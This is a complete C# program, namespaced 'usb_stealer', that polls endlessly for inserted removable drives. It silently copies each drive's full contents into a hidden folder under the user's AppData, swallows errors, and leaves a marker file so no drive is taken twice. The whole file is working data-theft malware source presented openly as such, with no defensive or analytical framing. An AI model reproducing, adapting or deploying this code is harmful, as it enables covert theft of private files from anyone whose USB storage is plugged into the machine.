using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.IO.Compression;

namespace usb_stealer
{
    internal static class Program
    {
        public static void Main(string[] args)
        {
            while (true)
            {
                var drives = DriveInfo.GetDrives()
                    .Where(drive => drive.IsReady && drive.DriveType == DriveType.Removable);

                foreach (var driveInfo in drives)
                {
                    try
                    {
                        StealData(driveInfo);
                    }
                    catch
                    {
                        Thread.Sleep(500);
                    }
                }
                
                Thread.Sleep(500);
            }
        }

        private static void StealData(DriveInfo dInfo)
        {
            if (Directory.Exists($@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\{dInfo.Name.Replace(@":\", "")}") && 
                File.Exists($@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\{dInfo.Name.Replace($@":\", "")}\xedone.txt"))
                return;
            
            
            var source = dInfo.Name;
            var destination = $@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\{dInfo.Name.Replace(@":\", "")}";

            Copy(source, destination);

            File.Create($@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\{dInfo.Name.Replace($@":\", "")}\xedone.txt");
        }
        
        private static void Copy(string sourceDirectory, string targetDirectory)
        {
            var diSource = new DirectoryInfo(sourceDirectory);
            var diTarget = new DirectoryInfo(targetDirectory);

            CopyAll(diSource, diTarget);
        }
        
        private static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            if (source.Name.Contains("System")) return;
            Directory.CreateDirectory(target.FullName);

            // Copy each file into the new directory.
            foreach (var fi in source.GetFiles())
            {
                fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
            }

            // Copy each subdirectory using recursion.
            foreach (var diSourceSubDir in source.GetDirectories())
            {
                var nextTargetSubDir =
                    target.CreateSubdirectory(diSourceSubDir.Name);
                CopyAll(diSourceSubDir, nextTargetSubDir);
            }
        }
        
    }
}